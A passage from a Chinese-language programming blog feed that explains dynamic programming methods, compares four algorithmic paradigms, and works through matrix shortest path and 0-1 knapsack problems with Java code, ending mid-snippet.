title="两种动态规划解题思路总结"></a>两种动态规划解题思路总结</h3><ol><li><strong>状态转移表法</strong></li></ol><p>一般能用动态规划解决的问题，都可以使用回溯算法的暴力搜索解决。所以，当我们拿到问题的时候，我们可以先用简单的回溯算法解决，然后定义状态，每个状态表示一个节点，然后对应画出递归树。从递归树中，我们很容易可以看出来，是否存在重复子问题，以及重复子问题是如何产生的。以此来寻找规律，看是否能用动态规划解决。</p><p>找到重复子问题之后，接下来，我们有两种处理思路，第一种是直接用<strong>回溯加“备忘录”</strong>的方法，来避免重复子问题。从执行效率上来讲，这跟动态规划的解决思路没有差别。第二种是使用动态规划的解决方法，<strong>状态转移表法</strong>。</p><p><strong>回溯算法实现 - 定义状态 - 画递归树 - 找重复子问题 - 画状态转移表 - 根据递推关系填表 - 将填表过程翻译成代码</strong></p><p>我们先画出一个状态表。状态表一般都是二维的，所以你可以把它想象成二维数组。其中，每个状态包含三个变量，行、列、数组值。我们根据决策的先后过程，从前往后，根据递推关系，分阶段填充状态表中的每个状态。最后，我们将这个递推填表的过程，翻译成代码，就是动态规划代码了。</p><p>尽管大部分状态表都是二维的，但是如果问题的状态比较复杂，需要很多变量来表示，那对应的状态表可能就是高维的，比如三维、四维。那这个时候，我们就不适合用状态转移表法来解决了。一方面是因为高维状态转移表不好画图表示，另一方面是因为人脑确实很不擅长思考高维的东西。</p><p>现在，我们来看一下，如何套用这个状态转移表法，来解决之前那个矩阵最短路径的问题？</p><p>从起点到终点，我们有很多种不同的走法。我们可以穷举所有走法，然后对比找出一个最短走法。不过如何才能无重复又不遗漏地穷举出所有走法呢？我们可以用回溯算法这个比较有规律的穷举算法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> minDist = Integer.MAX_VALUE; <span class="comment">// 全局变量或者成员变量</span></span><br><span class="line"><span class="comment">// 调用方式：minDistBacktracing(0, 0, 0, w, n);</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">minDistBT</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> dist, <span class="keyword">int</span>[][] w, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 到达了n-1, n-1这个位置了，这里看着有点奇怪哈，你自己举个例子看下</span></span><br><span class="line">  <span class="keyword">if</span> (i == n &amp;&amp; j == n) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dist &lt; minDist) minDist = dist;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (i &lt; n) &#123; <span class="comment">// 往下走，更新i=i+1, j=j</span></span><br><span class="line">    minDistBT(i + <span class="number">1</span>, j, dist+w[i][j], w, n);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (j &lt; n) &#123; <span class="comment">// 往右走，更新i=i, j=j+1</span></span><br><span class="line">    minDistBT(i, j+<span class="number">1</span>, dist+w[i][j], w, n);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了回溯代码之后，接下来，我们要画出递归树，以此来寻找重复子问题。在递归树中，一个状态（也就是一个节点）包含三个变量 (i, j, dist)，其中 i，j 分别表示行和列，dist 表示从起点到达 (i, j) 的路径长度。从图中，我们看出，尽管 (i, j, dist) 不存在重复的，但是 (i, j) 重复的有很多。对于 (i, j) 重复的节点，我们只需要选择 dist 最小的节点，继续递归求解，其他节点就可以舍弃了</p><img data-src="https://i.loli.net/2021/09/06/vH4RMShyizjWGKD.jpg" style="zoom:50%;" /><p>既然存在重复子问题，我们就可以尝试看下，是否可以用动态规划来解决呢？</p><p>我们画出一个二维状态表，表中的行、列表示棋子所在的位置，表中的数值表示从起点到这个位置的最短路径。我们按照决策过程，通过不断状态递推演进，将状态表填好。为了方便代码实现，我们按行来进行依次填充</p><img data-src="https://i.loli.net/2021/09/06/8YpWJRoqOnrcNgh.jpg" style="zoom:50%;" /><img data-src="https://i.loli.net/2021/09/06/jtu7ImVde3GslTF.jpg" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDistDP</span><span class="params">(<span class="keyword">int</span>[][] matrix, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>[][] states = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123; <span class="comment">// 初始化states的第一行数据</span></span><br><span class="line">    sum += matrix[<span class="number">0</span>][j];</span><br><span class="line">    states[<span class="number">0</span>][j] = sum;</span><br><span class="line">  &#125;</span><br><span class="line">  sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123; <span class="comment">// 初始化states的第一列数据</span></span><br><span class="line">    sum += matrix[i][<span class="number">0</span>];</span><br><span class="line">    states[i][<span class="number">0</span>] = sum;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">      states[i][j] = </span><br><span class="line">            matrix[i][j] + Math.min(states[i][j-<span class="number">1</span>], states[i-<span class="number">1</span>][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> states[n-<span class="number">1</span>][n-<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>状态转移方程法</strong></li></ol><p><strong>找最优子结构 - 写状态转移方程 - 将状态转移方程翻译成代码</strong></p><p>状态转移方程法有点类似递归的解题思路。我们需要分析，某个问题如何通过子问题来递归求解，也就是所谓的最优子结构。根据最优子结构，写出递归公式，也就是所谓的状态转移方程。</p><p>拿刚才例子举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">min_dist(i, j) &#x3D; w[i][j] + min(min_dist(i, j-1), min_dist(i-1, j))</span><br></pre></td></tr></table></figure><p>状态转移方程是解决动态规划的关键。如果我们能写出状态转移方程，那动态规划问题基本上就解决一大半了，而翻译成代码非常简单。但是很多动态规划问题的状态本身就不好定义，状态转移方程也就更不好想到。</p><p>下面我用递归加“备忘录”的方式，将状态转移方程翻译成来代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[][] matrix = </span><br><span class="line">         &#123;&#123;<span class="number">1</span>，<span class="number">3</span>，<span class="number">5</span>，<span class="number">9</span>&#125;, &#123;<span class="number">2</span>，<span class="number">1</span>，<span class="number">3</span>，<span class="number">4</span>&#125;，&#123;<span class="number">5</span>，<span class="number">2</span>，<span class="number">6</span>，<span class="number">7</span>&#125;，&#123;<span class="number">6</span>，<span class="number">8</span>，<span class="number">4</span>，<span class="number">3</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[][] mem = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDist</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123; <span class="comment">// 调用minDist(n-1, n-1);</span></span><br><span class="line">  <span class="keyword">if</span> (i == <span class="number">0</span> &amp;&amp; j == <span class="number">0</span>) <span class="keyword">return</span> matrix[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (mem[i][j] &gt; <span class="number">0</span>) <span class="keyword">return</span> mem[i][j];</span><br><span class="line">  <span class="keyword">int</span> minLeft = Integer.MAX_VALUE;</span><br><span class="line">  <span class="keyword">if</span> (j-<span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    minLeft = minDist(i, j-<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> minUp = Integer.MAX_VALUE;</span><br><span class="line">  <span class="keyword">if</span> (i-<span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    minUp = minDist(i-<span class="number">1</span>, j);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> currMinDist = matrix[i][j] + Math.min(minLeft, minUp);</span><br><span class="line">  mem[i][j] = currMinDist;</span><br><span class="line">  <span class="keyword">return</span> currMinDist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四种算法思想比较分析"><a href="#四种算法思想比较分析" class="headerlink" title="四种算法思想比较分析"></a>四种算法思想比较分析</h3><p>如果我们将这四种算法思想分一下类，那贪心、回溯、动态规划可以归为一类，而分治单独可以作为一类，因为它跟其他三个都不大一样。为什么这么说呢？前三个算法解决问题的模型，都可以抽象成我们今天讲的那个多阶段决策最优解模型，而分治算法解决的问题尽管大部分也是最优解问题，但是，大部分都不能抽象成多阶段决策模型。</p><p>回溯算法是个“万金油”。基本上能用的动态规划、贪心解决的问题，我们都可以用回溯算法解决。回溯算法相当于穷举搜索。穷举所有的情况，然后对比得到最优解。不过，回溯算法的时间复杂度非常高，是指数级别的，只能用来解决小规模数据的问题。对于大规模数据的问题，用回溯算法解决的执行效率就很低了。</p><p>尽管动态规划比回溯算法高效，但是，并不是所有问题，都可以用动态规划来解决。能用动态规划解决的问题，需要满足三个特征，最优子结构、无后效性和重复子问题。在重复子问题这一点上，动态规划和分治算法的区分非常明显。分治算法要求分割成的子问题，不能有重复子问题，而动态规划正好相反，动态规划之所以高效，就是因为回溯算法实现中存在大量的重复子问题。</p><p>贪心算法实际上是动态规划算法的一种特殊情况。它解决问题起来更加高效，代码实现也更加简洁。不过，它可以解决的问题也更加有限。它能解决的问题需要满足三个条件，最优子结构、无后效性和贪心选择性（这里我们不怎么强调重复子问题）。</p><p>其中，最优子结构、无后效性跟动态规划中的无异。“贪心选择性”的意思是，通过局部最优的选择，能产生全局的最优选择。每一个阶段，我们都选择当前看起来最优的决策，所有阶段的决策完成之后，最终由这些局部最优解构成全局最优解。</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://i.loli.net/2021/09/06/vP3QhA5EgiRsc92.jpg&quot; style=&quot;zoom:50%;&quot; /&gt;

&lt;p&gt;什么样的问题可以用动态规划解决？解决动态规划问题的一般思考过程是什么样的？贪心、分治、回溯、动态规划这四种算法思想又有什么区别和联系？&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构与算法" scheme="https://speedpromise.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>初识动态规划</title>
    <link href="https://speedpromise.github.io/archives/2da9f3b9.html"/>
    <id>https://speedpromise.github.io/archives/2da9f3b9.html</id>
    <published>2021-09-06T01:29:42.000Z</published>
    <updated>2021-10-28T12:46:14.430Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://i.loli.net/2021/09/06/W1iAxbGIe42PtRs.jpg" style="zoom:50%;" /><p>淘宝的“双十一”购物节有各种促销活动，比如“满 200 元减 50 元”。如何从 n 个商品中抉择出方案使得商品价格总和最大程度接近满减条件（200元）?</p><span id="more"></span><p>动态规划比较适合用来求解最优问题，比如求最大值、最小值等等。它可以非常显著地降低时间复杂度，提高代码的执行效率。</p><h3 id="0-1-背包问题"><a href="#0-1-背包问题" class="headerlink" title="0-1 背包问题"></a>0-1 背包问题</h3><p>相比上节回溯算法，使用动态规划来解决这个背包问题能有效降低时间复杂度</p><p>我们将整个求解过程分为 n 个阶段，每个阶段会决策一个物品是否放入背包，我们会把每一层重复的状态合并，然后基于上一层的状态集合来推导下一层的状态集合。通过合并每一层重复状态可以保证每层状态个数不会超过 w（背包承载重量） 个，避免每层状态个数的指数增长。</p><p>我们使用一个二维数组 states[n][w+1]，来记录每层可以达到的不同状态。</p><p>第 0 个物品重量是 2，决策完后，用 states[0][0]=true 和 states[0][2]=true 来表示其放入和不放入两种状态。第 1 个物品重量也是 2，基于之前的背包状态，这个物品决策完后，就有三种状态： states[1][0]=true，states[1][2]=true，states[1][2]=true。</p><p>整个状态数组计算完后，只需在最后一层找一个值为 true 的最接近 w 的值，就是背包中物品总重量的最大值。</p><img data-src="https://static001.geekbang.org/resource/image/aa/b5/aaf51df520ea6b8056f4e62aed81a5b5.jpg" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">weight:物品重量，n:物品个数，w:背包可承载重量</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">knapsack</span><span class="params">(<span class="keyword">int</span>[] weight, <span class="keyword">int</span> n, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">boolean</span>[][] states = <span class="keyword">new</span> <span class="keyword">boolean</span>[n][w+<span class="number">1</span>]; <span class="comment">// 默认值false</span></span><br><span class="line">  states[<span class="number">0</span>][<span class="number">0</span>] = <span class="keyword">true</span>;  <span class="comment">// 第一行的数据要特殊处理，可以利用哨兵优化</span></span><br><span class="line">  <span class="keyword">if</span> (weight[<span class="number">0</span>] &lt;= w) &#123;</span><br><span class="line">    states[<span class="number">0</span>][weight[<span class="number">0</span>]] = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123; <span class="comment">// 动态规划状态转移</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= w; ++j) &#123;<span class="comment">// 不把第i个物品放入背包</span></span><br><span class="line">      <span class="keyword">if</span> (states[i-<span class="number">1</span>][j] == <span class="keyword">true</span>) states[i][j] = states[i-<span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= w-weight[i]; ++j) &#123;<span class="comment">//把第i个物品放入背包</span></span><br><span class="line">      <span class="keyword">if</span> (states[i-<span class="number">1</span>][j]==<span class="keyword">true</span>) states[i][j+weight[i]] = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = w; i &gt;= <span class="number">0</span>; --i) &#123; <span class="comment">// 输出结果</span></span><br><span class="line">    <span class="keyword">if</span> (states[n-<span class="number">1</span>][i] == <span class="keyword">true</span>) <span class="keyword">return</span> i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是一种用动态规划解决问题的思路。我们把问题分解为多个阶段，每个阶段对应一个决策。我们记录每一个阶段可达的状态集合（去掉重复的），然后通过当前阶段的状态集合，来推导下一个阶段的状态集合，动态地往前推进。</p><p>代码复杂度好分析，就是 O(n*w)，n 表示物品个数，w 表示背包可以承载总重量。</p><p>尽管动态规划的执行效率比较高，但是就刚刚的代码实现来说，我们需要额外申请一个 n 乘以 w+1 的二维数组，对空间的消耗比较多。所以，有时候，我们会说，动态规划是一种空间换时间的解决思路。那有什么办法可以降低空间消耗吗？</p><p>实际上，我们只需要一个大小为 w+1 的一维数组就可以解决这个问题。动态规划状态转移的过程，都可以基于这个一维数组来操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">knapsack2</span><span class="params">(<span class="keyword">int</span>[] items, <span class="keyword">int</span> n, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">boolean</span>[] states = <span class="keyword">new</span> <span class="keyword">boolean</span>[w+<span class="number">1</span>]; <span class="comment">// 默认值false</span></span><br><span class="line">  states[<span class="number">0</span>] = <span class="keyword">true</span>;  <span class="comment">// 第一行的数据要特殊处理，可以利用哨兵优化</span></span><br><span class="line">  <span class="keyword">if</span> (items[<span class="number">0</span>] &lt;= w) &#123;</span><br><span class="line">    states[items[<span class="number">0</span>]] = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123; <span class="comment">// 动态规划</span></span><br><span class="line">    <span class="comment">// 按照 j 从小到大处理的话，会出现 for 循环重复计算的问题。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = w-items[i]; j &gt;= <span class="number">0</span>; --j) &#123;<span class="comment">//把第i个物品放入背包</span></span><br><span class="line">      <span class="keyword">if</span> (states[j]==<span class="keyword">true</span>) states[j+items[i]] = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = w; i &gt;= <span class="number">0</span>; --i) &#123; <span class="comment">// 输出结果</span></span><br><span class="line">    <span class="keyword">if</span> (states[i] == <span class="keyword">true</span>) <span class="keyword">return</span> i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0-1-背包问题升级版"><a href="#0-1-背包问题升级版" class="headerlink" title="0-1 背包问题升级版"></a>0-1 背包问题升级版</h3><p>现在引入物品价值这一变量，对于一组不同重量、不同价值、不可分割的物品，我们选择将某些物品装入背包，在满足背包最大重量限制的前提下，背包中可装入物品的总价值最大是多少呢？</p><p>先看回溯算法代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private int maxV &#x3D; Integer.MIN_VALUE; &#x2F;&#x2F; 结果放到maxV中</span><br><span class="line">private int[] items &#x3D; &#123;2，2，4，6，3&#125;;  &#x2F;&#x2F; 物品的重量</span><br><span class="line">private int[] value &#x3D; &#123;3，4，8，9，6&#125;; &#x2F;&#x2F; 物品的价值</span><br><span class="line">private int n &#x3D; 5; &#x2F;&#x2F; 物品个数</span><br><span class="line">private int w &#x3D; 9; &#x2F;&#x2F; 背包承受的最大重量</span><br><span class="line">public void f(int i, int cw, int cv) &#123; &#x2F;&#x2F; 调用f(0, 0, 0)</span><br><span class="line">  if (cw &#x3D;&#x3D; w || i &#x3D;&#x3D; n) &#123; &#x2F;&#x2F; cw&#x3D;&#x3D;w表示装满了，i&#x3D;&#x3D;n表示物品都考察完了</span><br><span class="line">    if (cv &gt; maxV) maxV &#x3D; cv;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  f(i+1, cw, cv); &#x2F;&#x2F; 选择不装第i个物品</span><br><span class="line">  if (cw + weight[i] &lt;&#x3D; w) &#123;</span><br><span class="line">    f(i+1,cw+weight[i], cv+value[i]); &#x2F;&#x2F; 选择装第i个物品</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在递归树中，每个节点表示一个状态。现在我们需要 3 个变量（i, cw, cv）来表示一个状态。其中，i 表示即将要决策第 i 个物品是否装入背包，cw 表示当前背包中物品的总重量，cv 表示当前背包中物品的总价值。</p><img data-src="https://i.loli.net/2021/09/06/lQfxFzAW7pb8Oyr.jpg" style="zoom:50%;" /><p>可以发现，在递归树中，有几个节点的 i 和 cw 是完全相同的，比如 f(2,2,4) 和 f(2,2,3)。在背包中物品总重量一样的情况下，f(2,2,4) 这种状态对应的物品总价值更大，我们可以舍弃 f(2,2,3) 这种状态，只需要沿着 f(2,2,4) 这条决策路线继续往下决策就可以。</p><p>接下来看动态规划如何解决。</p><p>还是把整个求解过程分为 n 个阶段，用一个二维数组 states[n][w+1]，来记录每层可以达到的不同状态。不过这里数组存储的值不再是 boolean 类型的了，而是当前状态对应的最大总价值。我们把每一层中 (i, cw) 重复的状态（节点）合并，只记录 cv 值最大的那个状态，然后基于这些状态来推导下一层的状态。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">knapsack3</span><span class="params">(<span class="keyword">int</span>[] weight, <span class="keyword">int</span>[] value, <span class="keyword">int</span> n, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>[][] states = <span class="keyword">new</span> <span class="keyword">int</span>[n][w+<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123; <span class="comment">// 初始化states</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; w+<span class="number">1</span>; ++j) &#123;</span><br><span class="line">      states[i][j] = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  states[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (weight[<span class="number">0</span>] &lt;= w) &#123;</span><br><span class="line">    states[<span class="number">0</span>][weight[<span class="number">0</span>]] = value[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123; <span class="comment">//动态规划，状态转移</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= w; ++j) &#123; <span class="comment">// 不选择第i个物品</span></span><br><span class="line">      <span class="keyword">if</span> (states[i-<span class="number">1</span>][j] &gt;= <span class="number">0</span>) states[i][j] = states[i-<span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= w-weight[i]; ++j) &#123; <span class="comment">// 选择第i个物品</span></span><br><span class="line">      <span class="keyword">if</span> (states[i-<span class="number">1</span>][j] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = states[i-<span class="number">1</span>][j] + value[i];</span><br><span class="line">        <span class="keyword">if</span> (v &gt; states[i][j+weight[i]]) &#123;</span><br><span class="line">          states[i][j+weight[i]] = v;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 找出最大值</span></span><br><span class="line">  <span class="keyword">int</span> maxvalue = -<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= w; ++j) &#123;</span><br><span class="line">    <span class="keyword">if</span> (states[n-<span class="number">1</span>][j] &gt; maxvalue) maxvalue = states[n-<span class="number">1</span>][j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> maxvalue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度是 O(n*w)，空间复杂度也是 O(n*w)。跟上一个例子类似，空间复杂度也是可以优化的，你可以自己写一下。</p><h3 id="解答开篇"><a href="#解答开篇" class="headerlink" title="解答开篇"></a>解答开篇</h3><p>开篇问题和0-1背包问题很像，“重量”换成了“价格”而已。购物车有 n 个商品，用一个二维数组 states[n][x]，来记录每次决策之后所有可达的状态。</p><p>0-1 背包问题中，我们找的是小于等于 w 的最大值，x 就是背包的最大承载重量 w+1。对于这个问题来说，我们要找的是大于等于 200（满减条件）的值中最小的，所以就不能设置为 200 加 1 了。就这个实际的问题而言，如果要购买的物品的总价格超过 200 太多，比如 1000，那这个羊毛“薅”得就没有太大意义了。所以，我们可以限定 x 值为 1001。</p><p>不过，这个问题不仅要求大于等于 200 的总价格中的最小的，我们还要找出这个最小总价格对应都要购买哪些商品。实际上，我们可以利用 states 数组，倒推出这个被选择的商品序列。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// items商品价格，n商品个数, w表示满减条件，比如200</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">double11advance</span><span class="params">(<span class="keyword">int</span>[] items, <span class="keyword">int</span> n, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">boolean</span>[][] states = <span class="keyword">new</span> <span class="keyword">boolean</span>[n][<span class="number">3</span>*w+<span class="number">1</span>];<span class="comment">//超过3倍就没有薅羊毛的价值了</span></span><br><span class="line">  states[<span class="number">0</span>][<span class="number">0</span>] = <span class="keyword">true</span>;  <span class="comment">// 第一行的数据要特殊处理</span></span><br><span class="line">  <span class="keyword">if</span> (items[<span class="number">0</span>] &lt;= <span class="number">3</span>*w) &#123;</span><br><span class="line">    states[<span class="number">0</span>][items[<span class="number">0</span>]] = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123; <span class="comment">// 动态规划</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">3</span>*w; ++j) &#123;<span class="comment">// 不购买第i个商品</span></span><br><span 